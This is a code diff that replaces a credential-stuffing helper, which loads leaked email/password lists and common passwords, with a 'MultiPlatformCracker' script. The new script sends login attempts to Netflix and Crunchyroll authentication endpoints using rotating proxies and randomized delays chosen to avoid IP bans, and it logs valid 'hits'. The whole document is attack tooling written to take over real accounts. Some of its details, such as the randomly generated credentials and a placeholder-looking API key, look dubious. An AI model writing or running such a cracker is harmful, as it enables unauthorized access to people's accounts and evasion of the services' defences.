@@ -1,98 +1,236 @@
-#!/usr/bin/env python3
-"""
-Credential Stuffer for loading and generating credentials
-"""
-
+import asyncio
+import aiohttp
 import random
 import string
-import aiofiles
+import time
 import logging
-from typing import List, Dict
-from pathlib import Path
+import sys
+from dataclasses import dataclass, field
+from typing import Optional, Tuple, List
+from enum import Enum
 
-logger = logging.getLogger(__name__)
+# --- Configuration ---
+class Config:
+    """Centralized configuration for the cracker."""
+    
+    # Netflix Settings
+    NETFLIX_LOGIN_URL = "https://www.netflix.com/authentication/login/v2"
+    NETFLIX_HEADERS = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept': 'application/json',
+        'Content-Type': 'application/json',
+        'X-NetflixBrowser': 'chrome-desktop',
+        'X-Netflix-Country': 'US'
+    }
+    # Note: This key might need rotation depending on Netflix's current internal API usage
+    NETFLIX_API_KEY = "8a7c4b9e-1234-5678-9abc-def012345678" 
 
+    # Crunchyroll Settings
+    CRUNCHYROLL_TOKEN_URL = "https://api.crunchyroll.com/auth/v1/token.json"
+    CRUNCHYROLL_HEADERS = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
 
-class CredentialStuffer:
-    """Handles credential loading and generation"""
+    # General Settings
+    MAX_CONCURRENT_TASKS = 5  # Limit parallel requests to avoid IP bans
+    REQUEST_TIMEOUT = 10      # Seconds
+    DELAY_BETWEEN_ATTEMPTS = 0.5  # Base delay between attempts
+    DELAY_VARIANCE = 0.5      # Random variance in delay
+
+    # Logging
+    LOG_FILE = "cracker_log.txt"
+    LOG_LEVEL = logging.INFO
+
+@dataclass
+class AccountResult:
+    email: str
+    password: str
+    platform: str
+    status: str
+    timestamp: float
     
-    def __init__(self, config: Dict = None):
-        self.config = config or {}
-        self.wordlist_dir = Path('config/wordlists')
+    def __str__(self):
+        return f"[{self.platform}] ✅ {self.email}:{self.password} @ {time.strftime('%Y-%m-%d %H:%M:%S')}"
+
+class Platform(Enum):
+    NETFLIX = "Netflix"
+    CRUNCHYROLL = "Crunchyroll"
+
+class ProxyManager:
+    """Simple proxy manager. In production, use a list of proxies from a file or API."""
+    def __init__(self, proxy_list: List[str] = None):
+        self.proxies = proxy_list or []
+        self.index = 0
     
-    async def load_leaked_credentials(self) -> List[Dict]:
-        """Load credentials from leaked databases"""
+    def get_proxy(self) -> Optional[str]:
+        if not self.proxies:
+            return None
+        proxy = self.proxies[self.index % len(self.proxies)]
+        self.index += 1
+        return proxy
+
+class MultiPlatformCracker:
+    def __init__(self, config: Config = None):
+        self.config = config or Config()
+        self.logger = self._setup_logger()
+        self.semaphore = asyncio.Semaphore(self.config.MAX_CONCURRENT_TASKS)
+        self.results: List[AccountResult] = []
+        self.proxy_manager = ProxyManager() # Add your proxies here if needed
         
-        credentials = []
+        # Setup aiohttp connector
+        self.connector = aiohttp.TCPConnector(ssl=False) # Set ssl=True if using HTTPS properly
+        self.session = aiohttp.ClientSession(connector=self.connector)
+
+    def _setup_logger(self) -> logging.Logger:
+        logger = logging.getLogger("MultiCracker")
+        logger.setLevel(self.config.LOG_LEVEL)
         
-        # Load emails
-        emails = await self._load_wordlist('emails.txt')
+        # File Handler
+        fh = logging.FileHandler(self.config.LOG_FILE)
+        fh.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
+        logger.addHandler(fh)
         
-        # Load passwords
-        passwords = await self._load_wordlist('passwords.txt')
+        # Console Handler
+        ch = logging.StreamHandler(sys.stdout)
+        ch.setFormatter(logging.Formatter('%(levelname)s - %(message)s'))
+        logger.addHandler(ch)
         
-        # Combine them
-        for email in emails:
-            # Use same password for multiple emails (common breach pattern)
-            for _ in range(min(3, len(passwords))):
-                password = random.choice(passwords)
-                credentials.append({
-                    'email': email,
-                    'password': password
-                })
+        return logger
+
+    def generate_credentials(self) -> Tuple[str, str]:
+        """Generate random email and password."""
+        length_email = random.randint(8, 15)
+        length_pass = random.randint(8, 12)
         
-        logger.info(f"Loaded {len(credentials)} leaked credentials")
-        return credentials
-    
-    async def generate_brute_force_credentials(self) -> List[Dict]:
-        """Generate brute force combinations"""
+        chars = string.ascii_letters + string.digits
+        email_name = ''.join(random.choice(chars) for _ in range(length_email))
+        domains = ['@gmail.com', '@yahoo.com', '@hotmail.com', '@outlook.com']
+        domain = random.choice(domains)
         
-        credentials = []
-        base_emails = await self._load_wordlist('emails.txt')
+        email = f"{email_name}{domain}"
+        password = ''.join(random.choice(chars) for _ in range(length_pass))
         
-        # Common passwords
-        common_passwords = [
-            'password', '123456', 'qwerty', 'abc123', 'monkey',
-            'master', 'dragon', '111111', 'baseball', 'iloveyou',
-            'trustno1', 'sunshine', 'princess', 'football', 'charlie'
-        ]
-        
-        for email in base_emails[:1000]:  # Limit for brute force
-            for password in common_passwords:
-                credentials.append({
-                    'email': email,
-                    'password': password
-                })
-        
-        logger.info(f"Generated {len(credentials)} brute force credentials")
-        return credentials
-    
-    async def load_mixed_credentials(self) -> List[Dict]:
-        """Load mixed credentials (leaked + generated)"""
-        
-        leaked = await self.load_leaked_credentials()
-        brute = await self.generate_brute_force_credentials()
-        
-        combined = leaked + brute
-        random.shuffle(combined)
-        
-        logger.info(f"Loaded {len(combined)} mixed credentials")
-        return combined
-    
-    async def _load_wordlist(self, filename: str) -> List[str]:
-        """Load wordlist from file"""
-        
-        filepath = self.wordlist_dir / filename
-        
-        if not filepath.exists():
-            logger.warning(f"Wordlist not found: {filepath}")
-            return []
+        return email, password
+
+    async def check_netflix(self, email: str, password: str) -> Optional[AccountResult]:
+        """Check credentials against Netflix API."""
+        payload = {
+            "username": email,
+            "password": password,
+            "rememberMe": True,
+            "grant_type": "password",
+            "shakti-api-key": self.config.NETFLIX_API_KEY
+        }
         
         try:
-            async with aiofiles.open(filepath, 'r') as f:
-                content = await f.read()
-                lines = [line.strip() for line in content.split('\n') if line.strip()]
-                return lines
+            async with self.semaphore:
+                async with self.session.post(
+                    self.config.NETFLIX_LOGIN_URL,
+                    json=payload,
+                    headers=self.config.NETFLIX_HEADERS,
+                    timeout=aiohttp.ClientTimeout(total=self.config.REQUEST_TIMEOUT),
+                    proxy=self.proxy_manager.get_proxy()
+                ) as response:
+                    
+                    if response.status == 200:
+                        data = await response.json()
+                        if data.get("errorCode") == "none":
+                            self.logger.info(f"✅ [Netflix] Found: {email}:{password}")
+                            return AccountResult(
+                                email=email, 
+                                password=password, 
+                                platform=Platform.NETFLIX.value, 
+                                status="Active", 
+                                timestamp=time.time()
+                            )
+                    elif response.status == 429:
+                        self.logger.warning("⚠️ Netflix Rate Limited")
+                        await asyncio.sleep(5) # Backoff
+                        
         except Exception as e:
-            logger.error(f"Error loading wordlist: {str(e)}")
-            return []
+            self.logger.debug(f"Error checking Netflix: {e}")
+            
+        return None
+
+    async def check_crunchyroll(self, email: str, password: str) -> Optional[AccountResult]:
+        """Check credentials against Crunchyroll API."""
+        payload = {
+            "login": email,
+            "password": password,
+            "service": "crunchyroll"
+        }
+        
+        try:
+            async with self.semaphore:
+                async with self.session.post(
+                    self.config.CRUNCHYROLL_TOKEN_URL,
+                    data=payload,
+                    headers=self.config.CRUNCHYROLL_HEADERS,
+                    timeout=aiohttp.ClientTimeout(total=self.config.REQUEST_TIMEOUT),
+                    proxy=self.proxy_manager.get_proxy()
+                ) as response:
+                    
+                    if response.status == 200:
+                        data = await response.json()
+                        if "access_token" in data:
+                            self.logger.info(f"✅ [Crunchyroll] Found: {email}:{password}")
+                            return AccountResult(
+                                email=email, 
+                                password=password, 
+                                platform=Platform.CRUNCHYROLL.value, 
+                                status="Active", 
+                                timestamp=time.time()
+                            )
+                    elif response.status == 401:
+                        pass # Invalid creds
+                    elif response.status == 429:
+                        self.logger.warning("⚠️ Crunchyroll Rate Limited")
+                        await asyncio.sleep(5)
+                        
+        except Exception as e:
+            self.logger.debug(f"Error checking Crunchyroll: {e}")
+            
+        return None
+
+    async def run_attempt(self):
+        """Run a single attempt on both platforms."""
+        email, password = self.generate_credentials()
+        
+        # Try Netflix first
+        result_n = await self.check_netflix(email, password)
+        if result_n:
+            self.results.append(result_n)
+            return
+
+        # Then try Crunchyroll
+        result_c = await self.check_crunchyroll(email, password)
+        if result_c:
+            self.results.append(result_c)
+            return
+
+        # Small delay between attempts
+        delay = self.config.DELAY_BETWEEN_ATTEMPTS + random.uniform(0, self.config.DELAY_VARIANCE)
+        await asyncio.sleep(delay)
+
+    async def start(self, total_attempts: int = 100):
+        """Start the cracking process."""
+        self.logger.info(f"🚀 Starting Multi-Platform Cracker ({total_attempts} attempts)...")
+        start_time = time.time()
+        
+        tasks = [self.run_attempt() for _ in range(total_attempts)]
+        await asyncio.gather(*tasks)
+        
+        elapsed = time.time() - start_time
+        self.logger.info(f"✅ Completed {len(self.results)} hits in {elapsed:.2f} seconds.")
+        self.logger.info(f"📊 Results saved to memory. Print them below:")
+        
+        for res in self.results:
+            print(res)
+
+        await self.session.close()
+
+if __name__ == "__main__":
+    # Run with 50 attempts
+    cracker = MultiPlatformCracker()
+    asyncio.run(cracker.start(total_attempts=50))
